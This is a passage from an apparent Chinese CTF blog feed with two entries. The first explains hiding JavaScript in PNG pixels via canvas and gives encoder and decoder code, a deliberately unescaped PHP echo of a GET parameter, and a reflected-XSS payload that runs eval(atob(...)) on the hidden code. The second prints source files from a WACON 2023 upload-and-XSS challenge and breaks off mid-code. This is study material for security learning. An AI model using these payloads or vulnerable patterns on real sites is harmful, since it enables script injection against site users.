  <entry>
    <title>2023/09/09：canvas，png和xss</title>
    <link href="/2023/09/09/morexss/"/>
    <url>/2023/09/09/morexss/</url>
    
    <content type="html"><![CDATA[<p>《利用canvas将js代码隐藏到png中实现xss——关于HITCON CTF 2023一题都写不出来在网上找到一篇文章这件事》<br><a href="https://choudalao.com/article/267">https://choudalao.com/article/267</a><br>一些别的：<br><a href="https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350">https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350</a><br><a href="https://www.runoob.com/w3cnote/html5-canvas-intro.html">https://www.runoob.com/w3cnote/html5-canvas-intro.html</a></p><p>待继续尝试，先留个记录</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>每个源代码被转换为一个像素，图片加载到HTML文档后使用canvas getImageData方法，可提取隐藏的js并执行</p><h3 id="canvas-getImageData"><a href="#canvas-getImageData" class="headerlink" title="canvas getImageData()"></a>canvas getImageData()</h3><p>返回ImageData对象（不是图像），该对象拷贝了画布指定矩形的像素数据。<br>它规定了画布上一个部分（矩形），并保存了该矩形内每个像素的信息。对于 ImageData 对象中的每个像素，都存在着四方面的信息，即 RGBA 值：<br>R - 红色（0-255）<br>G - 绿色（0-255）<br>B - 蓝色（0-255）<br>A - alpha 通道（0-255; 0 是透明的，255 是完全可见的）<br>color/alpha 信息以数组形式存在，并存储于 ImageData 对象的 data 属性（返回一个对象，该对象包含指定的 ImageData 对象的图像数据）中。<br>如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">imgData</span>=ctx.createImageData(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<br><br><span class="hljs-attribute">imgData</span>.data[<span class="hljs-number">0</span>]=<span class="hljs-number">255</span>;<br><span class="hljs-attribute">imgData</span>.data[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-attribute">imgData</span>.data[<span class="hljs-number">2</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-attribute">imgData</span>.data[<span class="hljs-number">3</span>]=<span class="hljs-number">255</span>;<br></code></pre></td></tr></table></figure><p>可以把 ImageData 对象中的第一个像素变为红色</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><h3 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h3><p>在浏览器空白页打开js控制台，输入：</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">function</span> () &#123;<br>    function encode(<span class="hljs-name">a</span>) &#123;<br>        if (<span class="hljs-name">a.length</span>) &#123;<br>            var c = a.length,<br>                e = Math.ceil(<span class="hljs-name">Math.sqrt</span>(<span class="hljs-name">c</span> / <span class="hljs-number">3</span>)),<br>                f = e,<br>                g = document.createElement(<span class="hljs-string">&quot;canvas&quot;</span>),<br>                h = g.getContext(<span class="hljs-string">&quot;2d&quot;</span>)<span class="hljs-comment">;</span><br>            g.width = e, g.height = f<span class="hljs-comment">;</span><br>            var j = h.getImageData(<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, e, f),<br>                k = j.data,<br>                l = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>            for (<span class="hljs-name">var</span> m = <span class="hljs-number">0</span><span class="hljs-comment">; m &lt; f; m++)</span><br>                for (<span class="hljs-name">var</span> n = <span class="hljs-number">0</span><span class="hljs-comment">; n &lt; e; n++) &#123;</span><br>                    var o = <span class="hljs-number">4</span> * (<span class="hljs-name">m</span> * e) + <span class="hljs-number">4</span> * n,<br>                        p = a[<span class="hljs-name">l++</span>],<br>                        q = a[<span class="hljs-name">l++</span>],<br>                        r = a[<span class="hljs-name">l++</span>]<span class="hljs-comment">;</span><br>                    (<span class="hljs-name">p</span> || q || r) &amp;&amp; (<span class="hljs-name">p</span> &amp;&amp; (<span class="hljs-name">k</span>[<span class="hljs-name">o</span>] = ord(<span class="hljs-name">p</span>)), q &amp;&amp; (<span class="hljs-name">k</span>[<span class="hljs-name">o</span> + <span class="hljs-number">1</span>] = ord(<span class="hljs-name">q</span>)), r &amp;&amp; (<span class="hljs-name">k</span>[<span class="hljs-name">o</span> + <span class="hljs-number">2</span>] = ord(<span class="hljs-name">r</span>)), k[<span class="hljs-name">o</span> + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>)<br>                &#125;<br>            return h.putImageData(<span class="hljs-name">j</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), h.canvas.toDataURL()<br>        &#125;<br>    &#125;<br>    var ord = function ord(<span class="hljs-name">a</span>) &#123;<br>        var c = a + <span class="hljs-string">&quot;&quot;</span>,<br>            e = c.charCodeAt(<span class="hljs-name">0</span>)<span class="hljs-comment">;</span><br>        if (<span class="hljs-name">55296</span> &lt;= e &amp;&amp; <span class="hljs-number">56319</span> &gt;= e) &#123;<br>            if (<span class="hljs-name">1</span> === c.length) return e<span class="hljs-comment">;</span><br>            var f = c.charCodeAt(<span class="hljs-name">1</span>)<span class="hljs-comment">;</span><br>            return <span class="hljs-number">1024</span> * (<span class="hljs-name">e</span> - <span class="hljs-number">55296</span>) + (<span class="hljs-name">f</span> - <span class="hljs-number">56320</span>) + <span class="hljs-number">65536</span><br>        &#125;<br>        return <span class="hljs-number">56320</span> &lt;= e &amp;&amp; <span class="hljs-number">57343</span> &gt;= e ? e : e<br>    &#125;,<br>        d = document,<br>        b = d.body,<br>        img = new Image<span class="hljs-comment">;</span><br>    var stringenc = <span class="hljs-string">&quot;Hello, World!&quot;</span><span class="hljs-comment">;</span><br>    img.src = encode(<span class="hljs-name">stringenc</span>), b.innerHTML = <span class="hljs-string">&quot;&quot;</span>, b.appendChild(<span class="hljs-name">img</span>)<br>&#125;)()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>可生成（putImageData方法）一张图片，将“Hello,World!”字符串每组3个字符表示为每个像素的RGB级别（红、绿、蓝），此时页面左上角有个小图片<br>使用charCodeAt函数，我可以将每个字符转换为0到65535之间的整数，代表其UTF-16代码单元。在单个像素中，第一个转换的字符用于红色通道，第二个字符用于绿色通道，最后一个字符用于蓝色通道。第四个值是在我们的示例中始终为255的alpha级别。</p><h3 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs llvm">// 如何将该图片转换回其原始字符串<br>t <span class="hljs-operator">=</span> document.getElementsByTagName(<span class="hljs-string">&quot;img&quot;</span>)[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span><br>var s <span class="hljs-operator">=</span> String.fromCharCode<span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">&quot;canvas&quot;</span>)<span class="hljs-comment">;</span><br>var cs <span class="hljs-operator">=</span> <span class="hljs-keyword">c</span>.style<span class="hljs-punctuation">,</span><br>    cx <span class="hljs-operator">=</span> <span class="hljs-keyword">c</span>.getContext(<span class="hljs-string">&quot;2d&quot;</span>)<span class="hljs-punctuation">,</span><br>    w <span class="hljs-operator">=</span> t.offsetWidth<span class="hljs-punctuation">,</span><br>    h <span class="hljs-operator">=</span> t.offsetHeight<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span>.width <span class="hljs-operator">=</span> w<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span>.height <span class="hljs-operator">=</span> h<span class="hljs-comment">;</span><br>cs.width <span class="hljs-operator">=</span> w + <span class="hljs-string">&quot;px&quot;</span><span class="hljs-comment">;</span><br>cs.height <span class="hljs-operator">=</span> h + <span class="hljs-string">&quot;px&quot;</span><span class="hljs-comment">;</span><br>cx.drawImage(t<span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>var <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> cx.getImageData(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> w<span class="hljs-punctuation">,</span> h).data<span class="hljs-comment">;</span><br>var a <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    l <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>.length<span class="hljs-punctuation">,</span><br>    p <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">;</span><br>for (var i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; l; i += 4) &#123;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">0</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">0</span>])<span class="hljs-comment">;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">1</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">1</span>])<span class="hljs-comment">;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">2</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">2</span>])<span class="hljs-comment">;</span><br>&#125;<br>console.log(a)<span class="hljs-comment">;</span><br>document.getElementsByTagName(<span class="hljs-string">&quot;body&quot;</span>)[<span class="hljs-number">0</span>].innerHTML <span class="hljs-operator">=</span> a<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>JavaScript代码选择刚刚创建的图片元素，并使用getImageData将其转换为原始文本字符串。使用getImageData时，会发生这样的情况：你将获得一个ImageData对象，该对象的data属性包含一个大数组。如前所示，ImageData数组中每个像素都有四个元素：r、g、b和alpha。因此，该数组看起来像[pixel1R，pixel1G，pixel1B，pixel1Alpha，…，pixelNR，pixelNG，pixelNB，pixelNAlpha]。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="onload的js代码"><a href="#onload的js代码" class="headerlink" title="onload的js代码"></a>onload的js代码</h3><p>例：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;kw&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wd&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;s_ipt&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;wd&quot;</span>] <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;255&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>可输入wd的值拼接：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span><span class="hljs-string">&quot;&gt; &lt;img src=&quot;</span>xxx<span class="hljs-string">&quot; id=&quot;</span>jsimg<span class="hljs-string">&quot; onload=&quot;&quot; /&gt;</span><br>    &lt;a href=<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>可以利用img标签的onload=”javascript:eval()去触发事件，window.btoa用于编码base64，而atob用于解码base64，可以把我们图片还原代码先编码，注入onload时解码来执行js代码，所以我们构造onload=”javascript:eval(atob(“加密的js代码”))”进行攻击。<br>注入js代码将图片转换为外部的js库：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs llvm">// 需base<span class="hljs-number">64</span>加密的js代码<br>t <span class="hljs-operator">=</span> document.getElementById(<span class="hljs-string">&quot;jsimg&quot;</span>)<span class="hljs-comment">;</span><br>var s <span class="hljs-operator">=</span> String.fromCharCode<span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">&quot;canvas&quot;</span>)<span class="hljs-comment">;</span><br>var cs <span class="hljs-operator">=</span> <span class="hljs-keyword">c</span>.style<span class="hljs-punctuation">,</span><br>    cx <span class="hljs-operator">=</span> <span class="hljs-keyword">c</span>.getContext(<span class="hljs-string">&quot;2d&quot;</span>)<span class="hljs-punctuation">,</span><br>    w <span class="hljs-operator">=</span> t.offsetWidth<span class="hljs-punctuation">,</span><br>    h <span class="hljs-operator">=</span> t.offsetHeight<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span>.width <span class="hljs-operator">=</span> w<span class="hljs-comment">;</span><br><span class="hljs-keyword">c</span>.height <span class="hljs-operator">=</span> h<span class="hljs-comment">;</span><br>cs.width <span class="hljs-operator">=</span> w + <span class="hljs-string">&quot;px&quot;</span><span class="hljs-comment">;</span><br>cs.height <span class="hljs-operator">=</span> h + <span class="hljs-string">&quot;px&quot;</span><span class="hljs-comment">;</span><br>cx.drawImage(t<span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>var <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> cx.getImageData(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> w<span class="hljs-punctuation">,</span> h).data<span class="hljs-comment">;</span><br>var a <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    l <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>.length<span class="hljs-punctuation">,</span><br>    p <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">;</span><br>for (var i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; l; i += 4) &#123;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">0</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">0</span>])<span class="hljs-comment">;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">1</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">1</span>])<span class="hljs-comment">;</span><br>    if (<span class="hljs-keyword">x</span>[i + <span class="hljs-number">2</span>]) a +<span class="hljs-operator">=</span> s(<span class="hljs-keyword">x</span>[i + <span class="hljs-number">2</span>])<span class="hljs-comment">;</span><br>&#125;<br>eval(a)<br></code></pre></td></tr></table></figure><p>加密：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">var</span> str = &#x27;t = document.getElementById(<span class="hljs-string">&quot;jsimg&quot;</span>);<span class="hljs-built_in">var</span> s = String.fromCharCode, c = document.createElement(<span class="hljs-string">&quot;canvas&quot;</span>);<span class="hljs-built_in">var</span> cs = c.<span class="hljs-built_in">style</span>,cx = c.getContext(<span class="hljs-string">&quot;2d&quot;</span>),w = t.offsetWidth,h = t.offsetHeight;c.<span class="hljs-built_in">width</span> = w;c.<span class="hljs-built_in">height</span> = h;cs.<span class="hljs-built_in">width</span> = w + <span class="hljs-string">&quot;px&quot;</span>;cs.<span class="hljs-built_in">height</span> = h + <span class="hljs-string">&quot;px&quot;</span>;cx.drawImage(t, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">var</span> x = cx.getImageData(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, w, h).data;<span class="hljs-built_in">var</span> a = <span class="hljs-string">&quot;&quot;</span>,l = x.<span class="hljs-built_in">length</span>,p = -<span class="hljs-number">1</span>;<span class="hljs-keyword">for</span> (<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; l; i += <span class="hljs-number">4</span>) &#123;<span class="hljs-keyword">if</span> (x[i + <span class="hljs-number">0</span>]) a += s(x[i + <span class="hljs-number">0</span>]);<span class="hljs-keyword">if</span> (x[i + <span class="hljs-number">1</span>]) a += s(x[i + <span class="hljs-number">1</span>]);<span class="hljs-keyword">if</span> (x[i + <span class="hljs-number">2</span>]) a += s(x[i + <span class="hljs-number">2</span>]);&#125;<span class="hljs-built_in">eval</span>(a)&#x27;;<br><span class="hljs-built_in">var</span> res = window.btoa(str);<br>console.<span class="hljs-built_in">log</span>(res);<br></code></pre></td></tr></table></figure><p>最终：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">http:<span class="hljs-string">//dev.host.net/png.php</span>?wd=1<span class="hljs-string">&quot;&gt; &lt;img src=&quot;</span><span class="hljs-string">...</span>自行搭建的网站，需要将生成的图片上传到这里访问，这里写访问地址<span class="hljs-string">&quot; crossOrigin=&quot;</span>anonymous<span class="hljs-string">&quot; id=&quot;</span>jsimg<span class="hljs-string">&quot; onload=&#x27;javascript:eval(atob(&quot;</span><span class="hljs-string">......</span>加密为base64的内容<span class="hljs-string">&quot;))&#x27; /&gt;&lt;a href=&quot;</span><br></code></pre></td></tr></table></figure><h3 id="可能的问题"><a href="#可能的问题" class="headerlink" title="可能的问题"></a>可能的问题</h3><p>报错：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Uncaught DOMException: Failed to<span class="hljs-built_in"> execute </span>‘getImageData’ on ‘CanvasRenderingContext2D’: The canvas has been tainted by cross-origin data.<br></code></pre></td></tr></table></figure><p>原因：<br>将任何未经CORS批准从其他来源加载的数据绘制到画布中，画布就会被污染。被污染的画布不再被认为是安全的，任何从画布中检索图片数据的尝试都会导致引发异常。<br>解决：<br>恶意PNG图片要允许跨域<code>Access-Control-Allow-Origin：*</code><br>刚才的参数中增加一个属性<code>crossOrigin=&quot;anonymous&quot;</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/07：WACONCTF2023</title>
    <link href="/2023/09/07/WACON2023/"/>
    <url>/2023/09/07/WACON2023/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackmd.io/@sahuang/rkHD37ZA3">https://hackmd.io/@sahuang/rkHD37ZA3</a><br>啥也没写出来，留个记录</p><h2 id="warmup-revenge"><a href="#warmup-revenge" class="headerlink" title="warmup-revenge"></a>warmup-revenge</h2><p>文件上传+xss</p><p>查看源代码，注意到有bot.js，打开文件有setCookie函数，确认xss可能<br>有两个关键页面：<br>download.php：用来下载上传的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not Found&#x27;</span>);<br><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;idx&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>]<br>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fetch_row</span>(<span class="hljs-string">&#x27;board&#x27;</span>, <span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not Found&#x27;</span>);<br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_path&#x27;</span>];<br><span class="hljs-variable">$original</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/msie/i&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/5\.5/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;<span class="hljs-subst">$original</span>\&quot;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-transfer-encoding: binary&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Firefox/i&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;&quot;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-description: php generated data&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-length: &quot;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-disposition: attachment; filename=\&quot;<span class="hljs-subst">$original</span>\&quot;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-description: php generated data&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;pragma: no-cache&quot;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;expires: 0&quot;</span>);<br><span class="hljs-title function_ invoke__">flush</span>();<br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filepath</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);<br><br><span class="hljs-variable">$download_rate</span> = <span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$download_rate</span> * <span class="hljs-number">1024</span>));<br>    <span class="hljs-title function_ invoke__">flush</span>();<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span> (<span class="hljs-variable">$fp</span>);<br><span class="hljs-title function_ invoke__">flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>report.php：报告给bot以管理员身份访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_login</span>()) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login plz&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;idx&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;report&quot;</span>] + <span class="hljs-number">30</span> &gt; <span class="hljs-title function_ invoke__">time</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Too fast&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">fetch_row</span>(<span class="hljs-string">&#x27;board&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;idx&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;idx&#x27;</span>], <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), 